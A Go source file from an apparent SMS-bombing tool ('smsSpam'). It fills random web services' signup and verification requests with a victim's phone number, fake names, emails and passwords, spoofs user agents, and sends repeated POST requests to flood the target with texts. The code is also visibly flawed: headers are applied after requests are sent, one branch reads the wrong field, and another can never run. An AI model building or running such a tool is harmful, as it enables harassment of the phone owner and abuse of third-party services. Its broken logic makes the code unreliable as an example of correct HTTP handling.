package smsSpam

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func parse(phone string, service map[string]string) (string, string) {
	dataType := ""

	payload := service["url"]
	if _, exist := service["data"]; exist {
		payload = service["data"]
		dataType = "data"
	} else if _, exist := service["json"]; exist {
		payload = service["data"]
		dataType = "json"
	}
	for key, val := range map[string]string{
		"'":          "\"",
		`%phone%`:    phone,
		`%phone5%`:   transformNumber(phone, 5),
		`%name%`:     randomName(),
		`%email%`:    randomEmail(),
		`%password%`: randomPass()} {

		payload = strings.Replace(payload, key, val, -1)

	}
	return payload, dataType
}
func encodeURLValues(params map[string]string) url.Values {
	v := make(url.Values)
	for key, value := range params {
		v[key] = []string{value}
	}

	return v

}
func SendRequest(phone string) error {
	service := randomService()
	payload, dataType := parse(phone, service)
	headers := map[string]string{

		"X-Requested-With": "XMLHttpRequest",
		"Connection":       "keep-alive",
		"Pragma":           "no-cache",
		"Cache-Control":    "no-cache",
		"Accept-Encoding":  "gzip, deflate, br",
		"User-agent":       randomUserAgent(),
	}
	if _, exist := service["headers"]; exist {
		json.NewDecoder(bytes.NewBuffer([]byte(service["headers"]))).Decode(&headers)

	}
	client := http.Client{Timeout: time.Second * time.Duration(timeout)}
	switch dataType {
	case "data":
		for i := 0; i <= 10; i++ {

			req, err := client.Post(service["url"], "", strings.NewReader(payload))

			if err != nil {
				return err
			}
			for key, val := range headers {
				req.Header.Set(key, val)
			}
		}
		break
	case "json":
		for i := 0; i <= 10; i++ {

			req, err := client.Post(service["url"], "application/json", strings.NewReader(payload))
			if err != nil {
				return err
			}
			for key, val := range headers {
				req.Header.Set(key, val)
			}
		}
		break

	case "url":
		for i := 0; i <= 10; i++ {
			log.Println(payload)
			req, err := client.Post(payload, "", nil)
			if err != nil {
				return err
			}
			for key, val := range headers {
				req.Header.Set(key, val)
			}

		}
		break
	}
	return nil
}
